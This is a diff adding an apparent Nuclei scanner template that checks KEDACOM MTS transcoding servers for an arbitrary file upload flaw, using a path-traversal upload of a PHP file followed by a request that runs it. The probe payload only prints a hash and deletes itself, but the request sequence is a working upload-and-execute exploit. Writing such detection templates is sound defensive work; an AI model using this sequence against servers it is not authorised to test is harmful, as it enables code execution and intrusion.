@@ -1,0 +1,38 @@
+id: KEDACOM-phoenix-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: KEDACOM MTS转码服务器存在任意文件上传漏洞，攻击这通过漏洞可以读取服务器任意信息。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/K3-1%E7%A7%91%E8%BE%BE-Kedacom%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0?id=k3-1%e7%a7%91%e8%be%be-kedacom%e7%b3%bb%e7%bb%9f-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"  
+http:
+  - raw:
+      - |
+        POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName={{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 166
+
+        ----WebKitFormBoundary
+        Content-Disposition: form-data; name="Filedata": filename="{{filename}}"
+        Content-Type: application/octet-stream
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        ----WebKitFormBoundary--
+      - |+
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
